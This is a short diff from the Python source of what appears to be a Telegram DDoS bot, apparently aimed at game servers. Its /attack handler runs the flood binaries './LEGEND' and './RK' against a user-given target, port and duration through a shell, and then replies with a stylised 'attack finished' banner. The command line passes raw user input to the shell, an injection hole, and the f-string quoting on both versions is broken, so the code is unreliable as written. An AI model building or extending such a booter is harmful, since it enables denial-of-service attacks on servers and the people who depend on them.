@@ -309,7 +309,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./LEGEND {target} {port} {time} "./RK {target} {port} {time} 600"
+                full_command = f"./LEGEND {target} {port} {time} "./RK {target} {port} {time}
                 process = subprocess.run(full_command, shell=True)
                 response = f"❌⚠️ ΔŦŦΔĆҜ 2 ₣ƗŇƗŞĦ€Đ ⚠️❌\n\n𝐓𝐀𝐑𝐆𝐄𝐓 --> {target}\n𝐏𝐎𝐑𝐓 --> {port}\n𝐓𝐈𝐌𝐄 --> {time} 𝐒𝐄𝐂.\n\n🌹TABISH 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐃𝐃𝐎𝐒🌹"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
